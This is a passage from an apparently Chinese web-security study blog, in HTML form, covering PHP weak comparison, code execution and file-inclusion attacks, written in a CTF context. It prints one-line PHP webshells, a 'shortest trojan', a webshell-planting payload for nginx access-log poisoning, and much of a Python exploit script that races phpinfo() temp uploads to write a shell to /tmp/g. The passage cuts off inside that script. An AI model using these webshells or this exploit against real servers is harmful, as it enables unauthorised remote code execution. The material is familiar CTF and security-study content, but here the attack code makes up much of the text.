+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png 2x"
+            sizes="auto"
+            alt="image-20221004224251811">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png" title="image-20221004224320923" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png 2x"
+            sizes="auto"
+            alt="image-20221004224320923">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png" title="image-20221004224444943" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png 2x"
+            sizes="auto"
+            alt="image-20221004224444943">
+    </a></figure></p>
+<h3 id="php弱类型比较" class="headerLink">
+    <a href="#php%e5%bc%b1%e7%b1%bb%e5%9e%8b%e6%af%94%e8%be%83" class="header-mark"></a>6.1 [php弱类型比较]</h3><p>php弱类型比较中，数字和字符串比较中，字符串转换成数字的过程中，会取字符串前面数字的值作为整个字符串转换成数字的值，比较“1admin”,转换成数字就是1，所以&quot;admin1&quot;的话，因为字符串没有数字，只能转换成0了，所以第一个才会是true。 而最后一个则是被php当成科学计数法的，计算，所以结果都是0，比较时会相等。 0x03: md5碰撞和strcmp函数绕过，可以看我的另外一篇博客。 0x04: is_numeric()函数会判断如果是数字和数字字符串的话，会返回true,否则返回false;</p>
+<h1 id="二php代码执行" class="headerLink">
+    <a href="#%e4%ba%8cphp%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>二.PHP代码执行</h1><h2 id="0x1-什么是php代码执行" class="headerLink">
+    <a href="#0x1-%e4%bb%80%e4%b9%88%e6%98%afphp%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>1 0x1 什么是PHP代码执行</h2><p>可控指PHP可解释执行的代码，PHP中有专门将字符串当做PHP代码执行的语言eval，通过控制eval里面的参数控制PHP代码的执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(&#34;要执行的PHP代码&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x2-代码执行和命令执行的区别" class="headerLink">
+    <a href="#0x2-%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e5%92%8c%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e7%9a%84%e5%8c%ba%e5%88%ab" class="header-mark"></a>2 0x2 代码执行和命令执行的区别</h2><p>执行参数不同</p>
+<p>代码执行的是PHP后者其他语言的代码，比如<code>phpinfo()</code></p>
+<p>而命令执行，一般执行的是shell命令，比如<code>ls /</code></p>
+<p>system 命令执行
+shell_exec 命令执行
+eval 代码执行</p>
+<h2 id="0x3-php代码执行的格式" class="headerLink">
+    <a href="#0x3-php%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e7%9a%84%e6%a0%bc%e5%bc%8f" class="header-mark"></a>3 0x3 PHP代码执行的格式</h2><p><strong>在PHP语言中，代码分为三种</strong></p>
+<h3 id="1函数调用" class="headerLink">
+    <a href="#1%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8" class="header-mark"></a>3.1 1.函数调用</h3><p>函数特征：函数名字，函数参数，返回值</p>
+<p>基本的语法：</p>
+<p>函数名   （ 参数 ）；</p>
+<p>error_reporting   (  0  ) ;</p>
+<h3 id="2类方法调用" class="headerLink">
+    <a href="#2%e7%b1%bb%e6%96%b9%e6%b3%95%e8%b0%83%e7%94%a8" class="header-mark"></a>3.2 2.类方法调用</h3><p>类的特征：类实例，方法名，方法参数，返回值</p>
+<p>？？？动态函数调用
+？？？静态函数调用</p>
+<h3 id="3语言结构调用" class="headerLink">
+    <a href="#3%e8%af%ad%e8%a8%80%e7%bb%93%e6%9e%84%e8%b0%83%e7%94%a8" class="header-mark"></a>3.3 3.语言结构调用</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34; ctfshow &#34; ;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x4-php代码执行后门" class="headerLink">
+    <a href="#0x4-php%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e5%90%8e%e9%97%a8" class="header-mark"></a>4 0x4 PHP代码执行后门</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eval($_POST[1]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最简单的PHP一句话后门，也叫PHP小马，如果我们想在服务器上(Windows系统)弹出计算器，发送POST请求即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1=system(&#34;calc&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>——&gt;蚁剑</p>
+<p>url地址：xxxxx
+连接密码：1</p>
+<p>若木马接收代码为<code>eval($_GET[1]);</code>
+我们需要手动写一个转接头，<strong>加在GET型请求的url后面</strong>：
+（GET转POST转接头）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?1=eval(\$_POST[1]);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x5-代码执行的类型" class="headerLink">
+    <a href="#0x5-%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e7%9a%84%e7%b1%bb%e5%9e%8b" class="header-mark"></a>5 0x5 代码执行的类型</h2><p><u>函数名+函数类型可控=可以执行任意代码</u></p>
+<p>1.危险函数型</p>
+<p><figure><a class="lightgallery" href="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" title="image-20220905205127371" data-thumbnail="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png">
+        <img
+            
+            loading="lazy"
+            src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png"
+            srcset="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png 1.5x, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png 2x"
+            sizes="auto"
+            alt="image-20220905205127371">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(&#34;sys&#34;.&#34;tem&#34;)=system
+</span></span><span class="line"><span class="cl">&lt;script language=&#34;php&#34;&gt;eval($_POST[1])&lt;/script&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>php5.6版本以前的可用</p>
+<p>最短木马：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?`$_GET[2]`;&amp;2=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="三php文件包含" class="headerLink">
+    <a href="#%e4%b8%89php%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="header-mark"></a>三.PHP文件包含</h1><p>该笔记借鉴了CSDN博主「ing_end」的原创文章，
+原文链接：https://blog.csdn.net/ing_end/article/details/123886703</p>
+<h3 id="0x1何为包含" class="headerLink">
+    <a href="#0x1%e4%bd%95%e4%b8%ba%e5%8c%85%e5%90%ab" class="header-mark"></a>0.1 0x1何为包含：</h3><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数</p>
+<p>的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。</p>
+<h3 id="0x2文件包含漏洞的产生" class="headerLink">
+    <a href="#0x2%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e7%9a%84%e4%ba%a7%e7%94%9f" class="header-mark"></a>0.2 0x2文件包含漏洞的产生：</h3><p>程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p>
+<p><strong>文件上传JEG PNG JPEG GlF先上传PNG图片马，然后再包含。</strong></p>
+<h3 id="0x3文件包含语句" class="headerLink">
+    <a href="#0x3%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e8%af%ad%e5%8f%a5" class="header-mark"></a>0.3 0x3文件包含语句：</h3><p>include( ) 文件包含失败时，会产生警告，脚本会继续运行。
+include_once() 与include()功能相同，文件只会被包含一次。
+require( ) 文件包含失败时，会产生错误，直接结束脚本执行。
+require_once( ) 与require( )功能相同，文件只会被包含一次。</p>
+<h3 id="0x4相关配置" class="headerLink">
+    <a href="#0x4%e7%9b%b8%e5%85%b3%e9%85%8d%e7%bd%ae" class="header-mark"></a>0.4 0x4相关配置：</h3><p>一般来讲，文件包含有本机文件包含和远程文件包含之分：</p>
+<p><strong>本地文件包含</strong>就是可以读取和打开本地文件
+<strong>远程文件包含</strong>（http，ftp，php伪协议）就是可以远程加载文件</p>
+<p>我们可以通过php.ini来进行配置。如下：
+allow_url_fopen=On/Off 本地文件包含(LFI)（开和关都可包含本地文件）
+allow_url_include=On/Off 远程文件包含(RFI)</p>
+<h3 id="0x5伪协议" class="headerLink">
+    <a href="#0x5%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="header-mark"></a>0.5 0x5伪协议：</h3><p>计算机中常见的协议:
+◎网络层协议：IP协议、ICMP协议、ARP协议、IGMP协议
+◎应用层协议：HTTP协议、HTTPS协议、FTP协议、SSH协议、RDP协议、gopher协议、qq拉起协议、百度云盘拉起协议</p>
+<p><strong>PHP中的伪协议</strong>：file协议、php协议、data协议</p>
+<p>（一下部分内容摘自charmersix <a href="https://www.charmersix.icu" target="_blank" rel="noopener noreferrer">www.charmersix.icu</a>）</p>
+<h3 id="0x6文件包含高级利用" class="headerLink">
+    <a href="#0x6%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e9%ab%98%e7%ba%a7%e5%88%a9%e7%94%a8" class="header-mark"></a>0.6 0x6文件包含高级利用</h3><h4 id="文件包含可控点" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e5%8f%af%e6%8e%a7%e7%82%b9" class="header-mark"></a>0.6.1 文件包含可控点</h4><ul>
+<li>文件名可控：可以控制协议头，优先使用data协议</li>
+<li>后缀可控：可以考虑路径跳转，参考file协议  ../../../../</li>
+</ul>
+<h4 id="nginx日志包含" class="headerLink">
+    <a href="#nginx%e6%97%a5%e5%bf%97%e5%8c%85%e5%90%ab" class="header-mark"></a>0.6.2 nginx日志包含</h4><p>nginx 的默认路径 <code>/var/log/nginx/access.log</code></p>
+<p>这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行</p>
+<p><figure><a class="lightgallery" href="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png" title="image-20220909192728299" data-thumbnail="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png">
+        <img
+            
+            loading="lazy"
+            src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png"
+            srcset="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png 1.5x, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png 2x"
+            sizes="auto"
+            alt="image-20220909192728299">
+    </a></figure></p>
+<p>然后再读取<code>/var/log/nginx/access.log</code>执行日志里的恶意代码</p>
+<p>常见出错地方（为正确内容）</p>
+<ul>
+<li>包含的文件路径错误（<code>/var/log/nginx/access.log）</code></li>
+<li>写入的UA语法错误（<code>&lt;?php eval($_POST[1]); ?&gt;</code>）</li>
+<li>转义错误（<code>file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;&quot;);</code>）</li>
+</ul>
+<p>php语法在双引号中的时需要转义，否则判断为空</p>
+<h3 id="临时文件包含" class="headerLink">
+    <a href="#%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="header-mark"></a>0.7 临时文件包含</h3><p>phpinfo(); 竞争上传，这里有个python2的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#!/usr/bin/python 
+</span></span><span class="line"><span class="cl">import sys
+</span></span><span class="line"><span class="cl">import threading
+</span></span><span class="line"><span class="cl">import socket
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def setup(host, port):
+</span></span><span class="line"><span class="cl">    TAG=&#34;Security Test&#34;
+</span></span><span class="line"><span class="cl">    PAYLOAD=&#34;&#34;&#34;%s\r
+</span></span><span class="line"><span class="cl">&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;\r&#34;&#34;&#34; % TAG
+</span></span><span class="line"><span class="cl">    REQ1_DATA=&#34;&#34;&#34;-----------------------------7dbff1ded0714\r
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;dummyname&#34;; filename=&#34;test.txt&#34;\r
+</span></span><span class="line"><span class="cl">Content-Type: text/plain\r
+</span></span><span class="line"><span class="cl">\r
+</span></span><span class="line"><span class="cl">%s
+</span></span><span class="line"><span class="cl">-----------------------------7dbff1ded0714--\r&#34;&#34;&#34; % PAYLOAD
+</span></span><span class="line"><span class="cl">    padding=&#34;A&#34; * 5000
+</span></span><span class="line"><span class="cl">    REQ1=&#34;&#34;&#34;POST /phpinfo.php?a=&#34;&#34;&#34;+padding+&#34;&#34;&#34; HTTP/1.1\r
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#34;&#34;&#34;+padding+&#34;&#34;&#34;\r
+</span></span><span class="line"><span class="cl">HTTP_ACCEPT: &#34;&#34;&#34; + padding + &#34;&#34;&#34;\r
+</span></span><span class="line"><span class="cl">HTTP_USER_AGENT: &#34;&#34;&#34;+padding+&#34;&#34;&#34;\r
+</span></span><span class="line"><span class="cl">HTTP_ACCEPT_LANGUAGE: &#34;&#34;&#34;+padding+&#34;&#34;&#34;\r
+</span></span><span class="line"><span class="cl">HTTP_PRAGMA: &#34;&#34;&#34;+padding+&#34;&#34;&#34;\r
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+</span></span><span class="line"><span class="cl">Content-Length: %s\r
+</span></span><span class="line"><span class="cl">Host: %s\r
+</span></span><span class="line"><span class="cl">\r
+</span></span><span class="line"><span class="cl">%s&#34;&#34;&#34; %(len(REQ1_DATA),host,REQ1_DATA)
+</span></span><span class="line"><span class="cl">    #modify this to suit the LFI script   
+</span></span><span class="line"><span class="cl">    LFIREQ=&#34;&#34;&#34;GET /lfi.php?file=%s HTTP/1.1\r
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/4.0\r
+</span></span><span class="line"><span class="cl">Proxy-Connection: Keep-Alive\r
+</span></span><span class="line"><span class="cl">Host: %s\r
+</span></span><span class="line"><span class="cl">\r
+</span></span><span class="line"><span class="cl">\r
+</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    return (REQ1, TAG, LFIREQ)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+</span></span><span class="line"><span class="cl">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span class="line"><span class="cl">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    s.connect((host, port))
+</span></span><span class="line"><span class="cl">    s2.connect((host, port))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    s.send(phpinforeq)
+</span></span><span class="line"><span class="cl">    d = &#34;&#34;
+</span></span><span class="line"><span class="cl">    while len(d) &lt; offset:
+</span></span><span class="line"><span class="cl">        d += s.recv(offset)
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        i = d.index(&#34;[tmp_name] =&amp;gt; &#34;)
+</span></span><span class="line"><span class="cl">        fn = d[i+17:i+31]
+</span></span><span class="line"><span class="cl">    except ValueError:
+</span></span><span class="line"><span class="cl">        return None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    s2.send(lfireq % (fn, host))
+</span></span><span class="line"><span class="cl">    d = s2.recv(4096)
+</span></span><span class="line"><span class="cl">    s.close()
+</span></span><span class="line"><span class="cl">    s2.close()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if d.find(tag) != -1:
+</span></span><span class="line"><span class="cl">        return fn
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">counter=0
+</span></span><span class="line"><span class="cl">class ThreadWorker(threading.Thread):
+</span></span><span class="line"><span class="cl">    def __init__(self, e, l, m, *args):
+</span></span><span class="line"><span class="cl">        threading.Thread.__init__(self)
+</span></span><span class="line"><span class="cl">        self.event = e
+</span></span><span class="line"><span class="cl">        self.lock =  l
+</span></span><span class="line"><span class="cl">        self.maxattempts = m
+</span></span><span class="line"><span class="cl">        self.args = args
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def run(self):
+</span></span><span class="line"><span class="cl">        global counter
+</span></span><span class="line"><span class="cl">        while not self.event.is_set():
+</span></span><span class="line"><span class="cl">            with self.lock:
+</span></span><span class="line"><span class="cl">                if counter &gt;= self.maxattempts:
+</span></span><span class="line"><span class="cl">                    return
+</span></span><span class="line"><span class="cl">                counter+=1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            try:
+</span></span><span class="line"><span class="cl">                x = phpInfoLFI(*self.args)
+</span></span><span class="line"><span class="cl">                if self.event.is_set():
+</span></span><span class="line"><span class="cl">                    break                
+</span></span><span class="line"><span class="cl">                if x:
+</span></span><span class="line"><span class="cl">                    print &#34;\nGot it! Shell created in /tmp/g&#34;
+</span></span><span class="line"><span class="cl">                    self.event.set()
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">            except socket.error:
+</span></span><span class="line"><span class="cl">                return
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def getOffset(host, port, phpinforeq):
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;Gets offset of tmp_name in the php output&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span class="line"><span class="cl">    s.connect((host,port))
+</span></span><span class="line"><span class="cl">    s.send(phpinforeq)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    d = &#34;&#34;
+</span></span><span class="line"><span class="cl">    while True:
+</span></span><span class="line"><span class="cl">        i = s.recv(4096)
+</span></span><span class="line"><span class="cl">        d+=i        
+</span></span><span class="line"><span class="cl">        if i == &#34;&#34;:
+</span></span><span class="line"><span class="cl">            break
+</span></span><span class="line"><span class="cl">        # detect the final chunk
+</span></span><span class="line"><span class="cl">        if i.endswith(&#34;0\r\n\r\n&#34;):
+</span></span><span class="line"><span class="cl">            break
+</span></span><span class="line"><span class="cl">    s.close()
+</span></span><span class="line"><span class="cl">    i = d.find(&#34;[tmp_name] =&amp;gt; &#34;)
+</span></span><span class="line"><span class="cl">    if i == -1:
+</span></span><span class="line"><span class="cl">        raise ValueError(&#34;No php tmp_name in phpinfo output&#34;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    print &#34;found %s at %i&#34; % (d[i:i+10],i)
+</span></span><span class="line"><span class="cl">    # padded up a bit
+</span></span><span class="line"><span class="cl">    return i+256
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def main():
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    print &#34;LFI With PHPInfo()&#34;
+</span></span><span class="line"><span class="cl">    print &#34;-=&#34; * 30
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if len(sys.argv) &lt; 2:
+</span></span><span class="line"><span class="cl">        print &#34;Usage: %s host [port] [threads]&#34; % sys.argv[0]
+</span></span><span class="line"><span class="cl">        sys.exit(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        host = socket.gethostbyname(sys.argv[1])
+</span></span><span class="line"><span class="cl">    except socket.error, e:
+</span></span><span class="line"><span class="cl">        print &#34;Error with hostname %s: %s&#34; % (sys.argv[1], e)
+</span></span><span class="line"><span class="cl">        sys.exit(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    port=80
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        port = int(sys.argv[2])
+</span></span><span class="line"><span class="cl">    except IndexError:
+</span></span><span class="line"><span class="cl">        pass
+</span></span><span class="line"><span class="cl">    except ValueError, e:
+</span></span><span class="line"><span class="cl">        print &#34;Error with port %d: %s&#34; % (sys.argv[2], e)
+</span></span><span class="line"><span class="cl">        sys.exit(1)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    poolsz=10
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        poolsz = int(sys.argv[3])
+</span></span><span class="line"><span class="cl">    except IndexError:
+</span></span><span class="line"><span class="cl">        pass
+</span></span><span class="line"><span class="cl">    except ValueError, e:
+</span></span><span class="line"><span class="cl">        print &#34;Error with poolsz %d: %s&#34; % (sys.argv[3], e)
